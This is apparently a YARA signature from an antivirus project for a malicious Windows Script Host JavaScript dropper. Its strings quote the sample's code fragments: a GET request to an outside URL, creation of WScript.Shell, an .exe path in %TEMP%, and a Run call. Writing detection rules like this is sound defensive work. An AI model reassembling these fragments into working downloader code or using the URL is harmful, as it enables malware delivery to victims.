rule sig_20160401_e9ca2b40e647e8d42860dee360cccd93 {
  meta:
    description = "datamaliciousorder - file 20160401_e9ca2b40e647e8d42860dee360cccd93.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0bc2226cd25c36cf9b5df99ae676e98e3d8e47a1fcb0c4acc72eed4b52b66b32"

  strings:
    $s1  = "AmIe[QwLmf](\"G\" + \"ET\", \"http://sirplusalot.org/p3owlk\", false);" fullword ascii
    $s2  = "var IlmIj = function KuHkh() {return WScript[VaKk](\"WScript\"+\".Shell\");}(), WzWi = 11;" fullword ascii
    $s3  = "function UypUbd(HtgTb, ZrPjf){PrYs = PrYs * 1; return HtgTb - ZrPjf;};" fullword ascii
    $s4  = "if (AmIe[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function XtwUiw() {return IlmIj[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"StTWyyfufWaGL.ex\" + \"e\";};" fullword ascii
    $s6  = "function ZqBs(){return IoGj + \"\";};" fullword ascii
    $s7  = "function BlbZf() {return ((OleCu == true) && (OleCu == BvzSwk)) ? 1 : PrYs;};" fullword ascii
    $s8  = "function RlgLt(MxGk){IlmIj[\"R\"+\"un\"](MxGk, PrYs, PrYs);};" fullword ascii
    $s9  = "var OleCu = false;" fullword ascii
    $s10 = "var SrsXi = false;" fullword ascii
    $s11 = "BvzSwk = true; " fullword ascii
    $s12 = "function WttNw()" fullword ascii
    $s13 = "var MlYsc = new this[\"Date\"]();" fullword ascii
    $s14 = "var BvzSwk = false;" fullword ascii
    $s15 = "OleCu = true; " fullword ascii
    $s16 = "function CkDgk(){return VaKk;};" fullword ascii
    $s17 = "function YeFil(KxzDq) {var HqMc = (1, 2, 3, 4, 5, KxzDq); return HqMc;};" fullword ascii
    $s18 = "return UypUbd(JztTd, HzMrx);" fullword ascii
    $s19 = "}while (NwEga);" fullword ascii
    $s20 = "function DgYf(){return 23;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}